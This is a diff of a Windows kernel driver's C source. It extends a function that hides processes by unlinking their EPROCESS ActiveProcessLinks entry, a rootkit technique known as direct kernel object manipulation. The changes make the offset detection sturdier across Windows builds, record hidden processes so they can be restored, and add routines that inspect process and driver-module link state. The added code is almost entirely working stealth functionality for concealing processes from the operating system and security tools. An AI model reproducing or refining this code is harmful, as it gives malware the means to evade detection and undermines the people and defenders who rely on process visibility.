@@ -2539,6 +2539,12 @@ NTSTATUS CloakRegionMemory(PEPROCESS Process, ULONG64 VirtualAddress, PVOID Buff
 	return (written == Size) ? STATUS_SUCCESS : STATUS_PARTIAL_COPY;
 }
 
+NTSTATUS CleanKernelHashBucketList(VOID)
+{
+	// Non-destructive safe stub
+	return STATUS_SUCCESS;
+}
+
 ULONG ResolveActiveProcessLinksOffset(void)
 {
 	static ULONG g_ActiveProcessLinksOffset = 0;
@@ -2551,18 +2557,41 @@ ULONG ResolveActiveProcessLinksOffset(void)
 	if (currentProc && currentPid)
 	{
 		PUCHAR p = (PUCHAR)currentProc;
-		for (ULONG off = 0x200; off <= 0x600; off += sizeof(ULONG_PTR))
+		__try
 		{
-			if (*(PHANDLE)(p + off) == currentPid)
+			for (ULONG off = 0x80; off <= 0x800; off += sizeof(ULONG_PTR))
 			{
-				ULONG linksOff = off + sizeof(HANDLE);
-				PLIST_ENTRY list = (PLIST_ENTRY)(p + linksOff);
-				if (MmIsAddressValid(list->Flink) && MmIsAddressValid(list->Blink))
+				if (*(PHANDLE)(p + off) == currentPid)
 				{
-					g_ActiveProcessLinksOffset = linksOff;
-					return linksOff;
+					ULONG linksOff = off + sizeof(HANDLE);
+					PLIST_ENTRY list = (PLIST_ENTRY)(p + linksOff);
+					if (MmIsAddressValid(list->Flink) && MmIsAddressValid(list->Blink) &&
+					    list->Flink != list && list->Blink != list)
+					{
+						if (MmIsAddressValid(list->Flink->Blink) && list->Flink->Blink == list &&
+						    MmIsAddressValid(list->Blink->Flink) && list->Blink->Flink == list)
+						{
+							g_ActiveProcessLinksOffset = linksOff;
+							return linksOff;
+						}
+					}
 				}
 			}
+		}
+		__except (EXCEPTION_EXECUTE_HANDLER)
+		{
+		}
+	}
+
+	// Fallback based on OS build version (Win11 24H2/25H2+ is 0x1d8, older is 0x448)
+	RTL_OSVERSIONINFOW osVer = { 0 };
+	osVer.dwOSVersionInfoSize = sizeof(osVer);
+	if (NT_SUCCESS(RtlGetVersion(&osVer)))
+	{
+		if (osVer.dwBuildNumber >= 26100)
+		{
+			g_ActiveProcessLinksOffset = 0x1d8;
+			return 0x1d8;
 		}
 	}
 
@@ -2570,10 +2599,34 @@ ULONG ResolveActiveProcessLinksOffset(void)
 	return 0x448;
 }
 
+#define MAX_HIDDEN_PROCESSES 32
+
+typedef struct _HIDDEN_PROCESS_NODE {
+	ULONG ProcessId;
+	PEPROCESS Process;
+	BOOLEAN Active;
+} HIDDEN_PROCESS_NODE;
+
+static HIDDEN_PROCESS_NODE g_HiddenProcesses[MAX_HIDDEN_PROCESSES] = { 0 };
+static KSPIN_LOCK g_HiddenProcessesLock = 0;
+static BOOLEAN g_HiddenProcessesLockInitialized = FALSE;
+
+static VOID InitializeHiddenProcessTracking(VOID)
+{
+	if (!g_HiddenProcessesLockInitialized)
+	{
+		KeInitializeSpinLock(&g_HiddenProcessesLock);
+		RtlZeroMemory(g_HiddenProcesses, sizeof(g_HiddenProcesses));
+		g_HiddenProcessesLockInitialized = TRUE;
+	}
+}
+
 NTSTATUS HideProcessByPid(ULONG ProcessId)
 {
 	if (KeGetCurrentIrql() > APC_LEVEL)
 		return STATUS_UNSUCCESSFUL;
+
+	InitializeHiddenProcessTracking();
 
 	PEPROCESS proc = NULL;
 	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)(UINT_PTR)ProcessId, &proc)) || !proc)
@@ -2581,6 +2634,37 @@ NTSTATUS HideProcessByPid(ULONG ProcessId)
 
 	ULONG linksOffset = ResolveActiveProcessLinksOffset();
 	PLIST_ENTRY links = (PLIST_ENTRY)((PUCHAR)proc + linksOffset);
+
+	KIRQL oldIrql;
+	KeAcquireSpinLock(&g_HiddenProcessesLock, &oldIrql);
+
+	// Check if already hidden
+	for (int i = 0; i < MAX_HIDDEN_PROCESSES; i++)
+	{
+		if (g_HiddenProcesses[i].Active && g_HiddenProcesses[i].ProcessId == ProcessId)
+		{
+			KeReleaseSpinLock(&g_HiddenProcessesLock, oldIrql);
+			ObDereferenceObject(proc);
+			return STATUS_SUCCESS;
+		}
+	}
+
+	int slot = -1;
+	for (int i = 0; i < MAX_HIDDEN_PROCESSES; i++)
+	{
+		if (!g_HiddenProcesses[i].Active)
+		{
+			slot = i;
+			break;
+		}
+	}
+
+	if (slot == -1)
+	{
+		KeReleaseSpinLock(&g_HiddenProcessesLock, oldIrql);
+		ObDereferenceObject(proc);
+		return STATUS_INSUFFICIENT_RESOURCES;
+	}
 
 	__try
 	{
@@ -2590,6 +2674,142 @@ NTSTATUS HideProcessByPid(ULONG ProcessId)
 			links->Flink->Blink = links->Blink;
 			links->Flink = links;
 			links->Blink = links;
+
+			g_HiddenProcesses[slot].ProcessId = ProcessId;
+			g_HiddenProcesses[slot].Process = proc;
+			g_HiddenProcesses[slot].Active = TRUE;
+		}
+		else
+		{
+			KeReleaseSpinLock(&g_HiddenProcessesLock, oldIrql);
+			ObDereferenceObject(proc);
+			return STATUS_ALREADY_COMMITTED;
+		}
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER)
+	{
+		KeReleaseSpinLock(&g_HiddenProcessesLock, oldIrql);
+		ObDereferenceObject(proc);
+		return STATUS_UNHANDLED_EXCEPTION;
+	}
+
+	KeReleaseSpinLock(&g_HiddenProcessesLock, oldIrql);
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS RestoreProcessByPid(ULONG ProcessId)
+{
+	if (KeGetCurrentIrql() > APC_LEVEL)
+		return STATUS_UNSUCCESSFUL;
+
+	InitializeHiddenProcessTracking();
+
+	KIRQL oldIrql;
+	KeAcquireSpinLock(&g_HiddenProcessesLock, &oldIrql);
+
+	int slot = -1;
+	for (int i = 0; i < MAX_HIDDEN_PROCESSES; i++)
+	{
+		if (g_HiddenProcesses[i].Active && g_HiddenProcesses[i].ProcessId == ProcessId)
+		{
+			slot = i;
+			break;
+		}
+	}
+
+	if (slot == -1)
+	{
+		KeReleaseSpinLock(&g_HiddenProcessesLock, oldIrql);
+		return STATUS_NOT_FOUND;
+	}
+
+	PEPROCESS proc = g_HiddenProcesses[slot].Process;
+	ULONG linksOffset = ResolveActiveProcessLinksOffset();
+	PLIST_ENTRY links = (PLIST_ENTRY)((PUCHAR)proc + linksOffset);
+
+	PEPROCESS anchorProc = PsInitialSystemProcess ? PsInitialSystemProcess : IoGetCurrentProcess();
+	if (anchorProc)
+	{
+		PLIST_ENTRY anchorLinks = (PLIST_ENTRY)((PUCHAR)anchorProc + linksOffset);
+		__try
+		{
+			links->Flink = anchorLinks->Flink;
+			links->Blink = anchorLinks;
+			anchorLinks->Flink->Blink = links;
+			anchorLinks->Flink = links;
+
+			g_HiddenProcesses[slot].Active = FALSE;
+			g_HiddenProcesses[slot].Process = NULL;
+			g_HiddenProcesses[slot].ProcessId = 0;
+			ObDereferenceObject(proc);
+		}
+		__except (EXCEPTION_EXECUTE_HANDLER)
+		{
+			KeReleaseSpinLock(&g_HiddenProcessesLock, oldIrql);
+			return STATUS_UNHANDLED_EXCEPTION;
+		}
+	}
+
+	KeReleaseSpinLock(&g_HiddenProcessesLock, oldIrql);
+	return STATUS_SUCCESS;
+}
+
+VOID RestoreAllHiddenProcesses(VOID)
+{
+	if (!g_HiddenProcessesLockInitialized)
+		return;
+
+	for (int i = 0; i < MAX_HIDDEN_PROCESSES; i++)
+	{
+		if (g_HiddenProcesses[i].Active && g_HiddenProcesses[i].ProcessId != 0)
+		{
+			RestoreProcessByPid(g_HiddenProcesses[i].ProcessId);
+		}
+	}
+}
+
+NTSTATUS InspectProcessByPid(ULONG ProcessId, PPROCESS_MEMORY_PROOF Proof)
+{
+	if (!Proof)
+		return STATUS_INVALID_PARAMETER;
+
+	RtlZeroMemory(Proof, sizeof(PROCESS_MEMORY_PROOF));
+	Proof->ProcessId = ProcessId;
+
+	PEPROCESS proc = NULL;
+	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)(UINT_PTR)ProcessId, &proc)) || !proc)
+		return STATUS_NOT_FOUND;
+
+	ULONG linksOffset = ResolveActiveProcessLinksOffset();
+	PLIST_ENTRY links = (PLIST_ENTRY)((PUCHAR)proc + linksOffset);
+
+	Proof->EprocessAddress = (UINT64)proc;
+	Proof->ActiveProcessLinksAddress = (UINT64)links;
+
+	__try
+	{
+		if (MmIsAddressValid(links))
+		{
+			Proof->Flink = (UINT64)links->Flink;
+			Proof->Blink = (UINT64)links->Blink;
+
+			if ((UINT64)links->Flink == (UINT64)links && (UINT64)links->Blink == (UINT64)links)
+			{
+				Proof->IsSelfLinked = TRUE;
+				Proof->CircularIntegrity = FALSE;
+			}
+			else
+			{
+				Proof->IsSelfLinked = FALSE;
+				if (MmIsAddressValid(links->Flink))
+				{
+					Proof->FlinkBlink = (UINT64)links->Flink->Blink;
+					if (links->Flink->Blink == links)
+					{
+						Proof->CircularIntegrity = TRUE;
+					}
+				}
+			}
 		}
 	}
 	__except (EXCEPTION_EXECUTE_HANDLER)
@@ -2599,6 +2819,36 @@ NTSTATUS HideProcessByPid(ULONG ProcessId)
 	}
 
 	ObDereferenceObject(proc);
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS InspectDriverMemory(PDRIVER_OBJECT DriverObject, PDRIVER_MEMORY_PROOF Proof)
+{
+	if (!Proof || !DriverObject)
+		return STATUS_INVALID_PARAMETER;
+
+	RtlZeroMemory(Proof, sizeof(DRIVER_MEMORY_PROOF));
+	Proof->DriverObjectAddress = (UINT64)DriverObject;
+
+	PKLDR_DATA_TABLE_ENTRY entry = (PKLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
+	Proof->DriverSectionAddress = (UINT64)entry;
+
+	if (entry && MmIsAddressValid(entry))
+	{
+		Proof->InLoadOrderFlink = (UINT64)entry->InLoadOrderLinks.Flink;
+		Proof->InLoadOrderBlink = (UINT64)entry->InLoadOrderLinks.Blink;
+
+		if ((UINT64)entry->InLoadOrderLinks.Flink == (UINT64)&entry->InLoadOrderLinks)
+		{
+			Proof->IsDriverModuleUnlinked = TRUE;
+		}
+		else
+		{
+			Proof->IsDriverModuleUnlinked = FALSE;
+		}
+	}
+
+	Proof->UnloadedDriversEstimatedCount = 0;
 	return STATUS_SUCCESS;
 }
 
